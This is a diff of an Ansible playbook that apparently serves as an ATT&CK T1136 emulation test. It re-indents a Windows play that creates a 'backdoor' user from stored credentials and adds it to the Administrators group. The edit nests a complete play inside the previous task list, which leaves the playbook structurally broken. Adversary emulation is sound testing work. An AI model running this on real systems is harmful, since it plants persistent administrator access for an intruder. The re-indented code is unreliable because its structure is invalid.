@@ -21,15 +21,15 @@
           debug: msg="Playbook Completed:T1136:passed:linux:"
           when: T1136.stdout == "1" 
 
-- name: Create Account - Windows
-  hosts: windows
-  vars_files:
-   - /opt/ansible/vars.yaml
-  tasks:
-        - name: Create a new system account
-          win_user:
-            name: "{{ username_backdoor }}"
-            password: "{{ password_backdoor }}"
-            state: present
-            groups: Administrators
-            groups_action: add
+        - name: Create Account - Windows
+          hosts: windows
+          vars_files:
+           - /opt/ansible/vars.yaml
+          tasks:
+                - name: Create a new system account
+                  win_user:
+                    name: "{{ username_backdoor }}"
+                    password: "{{ password_backdoor }}"
+                    state: present
+                    groups: Administrators
+                    groups_action: add
